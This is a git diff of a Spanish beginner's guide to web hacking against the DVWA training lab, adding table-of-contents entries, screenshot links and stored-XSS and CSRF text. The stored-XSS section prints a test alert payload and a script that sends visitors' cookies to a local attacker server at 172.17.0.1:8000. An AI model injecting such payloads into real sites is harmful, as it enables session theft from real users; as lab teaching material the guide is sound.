@@ -15,6 +15,9 @@ Este artículo es una guía de iniciación en hacking web que pretende explicar 
 7. [SQL injection](https://github.com/sapellaniz/dvwa#sql-injection)
 8. [SQL injection (Blind)](https://github.com/sapellaniz/dvwa#sql-injection-blind)
 9. [Weak Session IDs](https://github.com/sapellaniz/dvwa#weak-session-ids)
+10. [XSS Reflected](https://github.com/sapellaniz/dvwa#xss-reflected)
+11. [XSS Stored](https://github.com/sapellaniz/dvwa#xss-stored)
+12. [CSRF](https://github.com/sapellaniz/dvwa#csrf)
 
 # Despliegue
 
@@ -340,21 +343,23 @@ Con el nivel de seguridad alto seleccionado, podemos usar el mismo payload que u
 
 # XSS stored
 
-(pantallazo)
+![XSS Stored](https://github.com/sapellaniz/dvwa/blob/master/img/xss-stored-00.png)
 
 También conocido como XSS persistente, es el más dañino de los dos. Ocurre cuando un script malicioso se inyecta directamente en una aplicación web vulnerable. A diferencia del XSS Reflected, cada vez que la página infectada es visitada, el script se ejecuta en el navegador de la víctima, en vez de tener que engañar al usuario para que acceda a un enlace malicioso.
 
 ### Security: low
-Con el nivel de seguridad bajo seleccionado, tenemos un problema, como máximo podemos introducir 10 caracteres en el campo "Name" y 50 en el campo "Message", para poder enviar una cadena de cualquier longitud en ambos campos, podemos interceptar la petición con el navegador para editarla y reenviarla. (URL ENCODE??)
-
-(Pantallazo)
+Con el nivel de seguridad bajo seleccionado, tenemos un problema, como máximo podemos introducir 10 caracteres en el campo "Name" y 50 en el campo "Message", para poder enviar una cadena de cualquier longitud en ambos campos, podemos interceptar la petición con el navegador para editarla y reenviarla.
 
 Podemos comprobar cual es el campo del formulario vulnerable con el siguiente payload:
+
 ```
 <script>alert("XSS")</script>
 ```
 
+![XSS Stored](https://github.com/sapellaniz/dvwa/blob/master/img/xss-stored-00.png)
+
 Ambos campos son vulnerables, ahora podemos introducir un payload malicioso que nos envíe la cookie de cualquier usuario que visite la página:
+
 ```
 <script>document.location='http://172.17.0.1:8000/index.html?c='+document.cookie;</script>
 ```
@@ -369,9 +374,8 @@ https://owasp.org/www-community/xss-filter-evasion-cheatsheet
 
 
 # CSRF
-######
 
-(pantallazo)
+![CSRF](https://github.com/sapellaniz/dvwa/blob/master/img/csrf-00.png)
 
 La falsificación de solicitudes entre sitios (CSRF) es un ataque que obliga a un usuario final a ejecutar acciones no deseadas en una aplicación web en la que está autenticado actualmente. Para explotar esta vulnerabilidad, en este escenario, tendremos que combinarla con un XSS stored.
 
